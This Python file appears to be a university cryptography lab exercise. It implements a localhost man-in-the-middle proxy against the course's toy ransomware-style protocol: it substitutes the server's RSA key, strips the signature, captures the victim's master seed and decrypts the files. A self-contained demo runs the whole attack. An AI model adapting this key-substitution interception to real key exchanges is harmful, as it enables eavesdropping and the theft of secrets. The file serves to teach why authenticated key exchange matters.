from __future__ import annotations

import argparse
import base64
import json
import socket
import threading
import time
from pathlib import Path

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa

from compartido.protocolo import enviar_mensaje, recibir_mensaje
from material_profesor.generador_semillas import generar_semilla_maestra
from victima.cifrado import cifrar_archivo, descifrar_archivo, comparar_archivos


HOST = "127.0.0.1"
PUERTO_SERVIDOR = 5000
PUERTO_MITM = 5001


def _oaep():
    return padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None,
    )


def generar_par_mitm():
    privada = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    publica = privada.public_key()
    return privada, publica


def pem_publica(clave_publica) -> bytes:
    return clave_publica.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )


def b64(datos: bytes) -> str:
    return base64.b64encode(datos).decode("ascii")


def deb64(texto: str) -> bytes:
    return base64.b64decode(texto, validate=True)


class IntermediarioMITM:
    def __init__(self):
        self.skM, self.pkM = generar_par_mitm()
        self.pkS = None
        self.sV_interceptada = None
        self.idV = None
        self.activo = True

    def manejar_conexion(self, conexion_victima: socket.socket):
        try:
            mensaje = recibir_mensaje(conexion_victima)
            tipo = mensaje.get("tipo")
            print(f"[MITM] Recibido de víctima: {tipo}")

            if tipo == "registro":
                respuesta = self._proxy_registro(mensaje)
            elif tipo == "entrega_semilla":
                respuesta = self._proxy_entrega_semilla(mensaje)
            elif tipo == "solicitud_recuperacion":
                respuesta = {
                    "tipo": "error",
                    "mensaje": "MITM: use la semilla interceptada, no el pago",
                }
            else:
                respuesta = self._reenvio_transparente(mensaje)

            enviar_mensaje(conexion_victima, respuesta)
            print(f"[MITM] Respuesta a víctima: {respuesta.get('tipo')}")

        except Exception as error:
            print(f"[MITM] Error: {error}")
            try:
                enviar_mensaje(
                    conexion_victima,
                    {"tipo": "error", "mensaje": str(error)},
                )
            except OSError:
                pass

    def _conectar_servidor(self):
        conexion = socket.create_connection((HOST, PUERTO_SERVIDOR), timeout=10)
        conexion.settimeout(10)
        return conexion

    def _reenvio_transparente(self, mensaje: dict) -> dict:
        with self._conectar_servidor() as conexion_srv:
            enviar_mensaje(conexion_srv, mensaje)
            return recibir_mensaje(conexion_srv)

    def _proxy_registro(self, mensaje: dict) -> dict:
        self.idV = mensaje.get("idV")

        with self._conectar_servidor() as conexion_srv:
            enviar_mensaje(conexion_srv, mensaje)
            respuesta_srv = recibir_mensaje(conexion_srv)

        if respuesta_srv.get("tipo") != "registro_ok":
            return respuesta_srv

        self.pkS = serialization.load_pem_public_key(deb64(respuesta_srv["pkS"]))
        print("[MITM] pkS real del servidor conservada.")

        pkM_b64 = b64(pem_publica(self.pkM))
        respuesta_falsa = dict(respuesta_srv)
        respuesta_falsa["pkS"] = pkM_b64
        respuesta_falsa.pop("firmaS", None)

        print("[MITM] pkS sustituida por pkM y enviada a la víctima.")
        return respuesta_falsa

    def _proxy_entrega_semilla(self, mensaje: dict) -> dict:
        if self.pkS is None:
            raise RuntimeError("Aún no se ha interceptado pkS (falta el registro)")

        cifrado_con_pkM = deb64(mensaje["semilla_cifrada"])
        sV = self.skM.decrypt(cifrado_con_pkM, _oaep())
        if len(sV) != 32:
            raise RuntimeError("Semilla interceptada de longitud incorrecta")

        self.sV_interceptada = sV
        print(f"[MITM] ★ Semilla maestra INTERCEPTADA ({len(sV)} bytes).")

        cifrado_con_pkS = self.pkS.encrypt(sV, _oaep())
        mensaje_real = {
            "tipo": "entrega_semilla",
            "idV": mensaje["idV"],
            "semilla_cifrada": b64(cifrado_con_pkS),
        }

        with self._conectar_servidor() as conexion_srv:
            enviar_mensaje(conexion_srv, mensaje_real)
            confirmacion = recibir_mensaje(conexion_srv)

        print("[MITM] Semilla reenviada al servidor legítimo. Confirmación recibida.")
        return confirmacion

    def escuchar(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as escucha:
            escucha.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            escucha.bind((HOST, PUERTO_MITM))
            escucha.listen(5)
            print(f"=== MITM OFENSIVO (Modelo B) ===")
            print(f"Escuchando en {HOST}:{PUERTO_MITM}")
            print(f"Reenvía hacia el servidor en {HOST}:{PUERTO_SERVIDOR}")
            print("La víctima debe conectarse al puerto 5001 (no al 5000).\n")

            while self.activo:
                try:
                    escucha.settimeout(1.0)
                    try:
                        conexion, addr = escucha.accept()
                    except socket.timeout:
                        continue
                    with conexion:
                        conexion.settimeout(10)
                        self.manejar_conexion(conexion)
                except OSError:
                    break


def demo_completa():
    import tempfile
    import shutil
    from servidor.servidor import iniciar_servidor

    print("=== DEMO MITM OFENSIVO COMPLETA (Modelo B) ===\n")

    base = Path(tempfile.mkdtemp(prefix="mitm_ofensivo_"))
    originales = base / "originales"
    trabajo = base / "trabajo"
    cifrados = base / "cifrados"
    recuperados = base / "recuperados"
    for d in (originales, trabajo, cifrados, recuperados):
        d.mkdir()

    (originales / "documento.txt").write_text(
        "Documento secreto del laboratorio MITM.\n", encoding="utf-8"
    )
    (originales / "notas.txt").write_text(
        "Notas: prueba de intermediario ofensivo.\n", encoding="utf-8"
    )
    shutil.copytree(originales, trabajo, dirs_exist_ok=True)

    def _servidor():
        try:
            iniciar_servidor(exigir_autorizacion=False)
        except Exception:
            pass

    hilo_srv = threading.Thread(target=_servidor, daemon=True)
    hilo_srv.start()
    time.sleep(0.8)

    mitm = IntermediarioMITM()
    hilo_mitm = threading.Thread(target=mitm.escuchar, daemon=True)
    hilo_mitm.start()
    time.sleep(0.5)

    from cryptography.hazmat.primitives.asymmetric import rsa as rsa_mod
    from compartido.autenticacion import firmar_registro_victima

    privada_v = rsa_mod.generate_private_key(public_exponent=65537, key_size=2048)
    publica_v = privada_v.public_key()
    idV = "victima-mitm-demo"

    pkV_b64 = b64(pem_publica(publica_v))
    firma = firmar_registro_victima(privada_v, idV, pkV_b64)

    with socket.create_connection((HOST, PUERTO_MITM), timeout=5) as c:
        c.settimeout(5)
        enviar_mensaje(c, {
            "tipo": "registro",
            "idV": idV,
            "pkV": pkV_b64,
            "firmaV": b64(firma),
        })
        resp = recibir_mensaje(c)
    assert resp["tipo"] == "registro_ok", resp
    pk_recibida = serialization.load_pem_public_key(deb64(resp["pkS"]))
    print("[Víctima] Registro OK (recibió una pkS, en realidad es pkM).")

    sV_real = generar_semilla_maestra()
    cifrado = pk_recibida.encrypt(sV_real, _oaep())
    with socket.create_connection((HOST, PUERTO_MITM), timeout=5) as c:
        c.settimeout(5)
        enviar_mensaje(c, {
            "tipo": "entrega_semilla",
            "idV": idV,
            "semilla_cifrada": b64(cifrado),
        })
        conf = recibir_mensaje(c)
    assert conf["tipo"] == "confirmacion_semilla", conf
    print("[Víctima] Semilla entregada y confirmada.")

    for i, ruta in enumerate(sorted(trabajo.iterdir())):
        if ruta.is_file():
            cifrar_archivo(ruta, cifrados / f"{ruta.name}.enc.json", sV_real, idV, i)
            print(f"[Víctima] Cifrado: {ruta.name}")

    assert mitm.sV_interceptada is not None, "El MITM no interceptó la semilla"
    assert mitm.sV_interceptada == sV_real, "La semilla interceptada no coincide"

    print("\n[MITM] Recuperando archivos con la semilla interceptada (sin pago)...")
    for ruta in sorted(cifrados.glob("*.enc.json")):
        dest = descifrar_archivo(ruta, recuperados, mitm.sV_interceptada, idV)
        original = originales / dest.name
        igual = comparar_archivos(original, dest)
        assert igual, f"Fallo en {dest.name}"

    mitm.activo = False

    resultado = {
        "demostracion": "MITM ofensivo Modelo B",
        "semilla_interceptada": True,
        "servidor_recibio_semilla": True,
        "victima_completo_cifrado": True,
        "recuperacion_sin_pago": True,
        "archivos_identicos": True,
        "estado": "APROBADO",
    }
    print("\n=== RESULTADO FINAL ===")
    print(json.dumps(resultado, indent=2, ensure_ascii=False))

    shutil.rmtree(base, ignore_errors=True)
    return resultado


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--demo",
        action="store_true",
        help="Ejecuta la demostración completa autocontenida (M1–M6)",
    )
    args = parser.parse_args()

    if args.demo:
        demo_completa()
    else:
        mitm = IntermediarioMITM()
        try:
            mitm.escuchar()
        except KeyboardInterrupt:
            print("\nMITM detenido.")
            if mitm.sV_interceptada:
                print(f"Semilla interceptada disponible ({len(mitm.sV_interceptada)} bytes).")


if __name__ == "__main__":
    main()